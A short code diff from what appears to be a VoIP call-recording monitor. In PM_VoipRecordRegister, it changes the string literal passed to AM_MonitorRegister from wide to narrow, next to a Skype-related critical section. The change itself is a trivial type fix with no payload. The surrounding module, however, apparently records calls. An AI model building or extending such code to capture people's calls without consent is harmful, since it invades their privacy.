@@ -895,7 +895,7 @@ DWORD WINAPI PM_VoipRecordUnregister()
 
 void PM_VoipRecordRegister()
 {
-	AM_MonitorRegister(L"call", PM_VOIPRECORDAGENT, (BYTE*)PM_VoipRecordDispatch, (BYTE*)PM_VoipRecordStartStop, (BYTE*)PM_VoipRecordInit, (BYTE*)PM_VoipRecordUnregister);
+	AM_MonitorRegister("call", PM_VOIPRECORDAGENT, (BYTE*)PM_VoipRecordDispatch, (BYTE*)PM_VoipRecordStartStop, (BYTE*)PM_VoipRecordInit, (BYTE*)PM_VoipRecordUnregister);
 	InitializeCriticalSection(&skype_critic_sec);
 }
 
